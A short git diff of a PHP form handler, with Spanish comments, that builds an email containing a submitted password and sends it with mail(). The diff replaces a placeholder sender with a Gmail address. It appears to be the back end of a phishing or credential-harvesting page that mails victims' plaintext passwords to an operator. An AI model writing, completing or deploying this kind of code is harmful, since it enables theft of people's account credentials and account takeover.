@@ -14,7 +14,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $mensaje .= "Contraseña: $contrasena\n";
 
     // Enviar el correo
-    $headers = "From: webmaster@example.com"; // Cambia esto a tu dirección de correo electrónico
+    $headers = "From: blancacapa904@gmail.com"; // Cambia esto a tu dirección de correo electrónico
     mail($destinatario, $asunto, $mensaje, $headers);
 
     // Puedes redirigir al usuario a otra página después de enviar el correo
